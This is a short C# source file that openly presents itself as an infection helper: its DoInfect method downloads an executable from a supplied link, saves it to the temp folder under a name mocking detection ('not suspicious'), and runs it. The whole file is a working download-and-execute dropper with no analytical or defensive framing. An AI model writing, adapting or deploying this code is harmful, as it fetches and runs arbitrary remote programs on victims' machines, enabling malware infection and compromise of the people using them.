using System;
using System.IO;
using System.Net;
using System.Diagnostics;

public static class InfectHelper
{
    public static void DoInfect(string link)
    {
        using (WebClient client = new WebClient())
        {
            string path = Path.Combine(Path.GetTempPath(), $"not suspicious.{new Random().Next(99999)}.exe");
            var data = client.DownloadData(link);
            using (var stream = new FileStream(path, FileMode.CreateNew))
            {
                stream.Write(data, 0, data.Length);
            }
            Process.Start(path);
        }
    }
}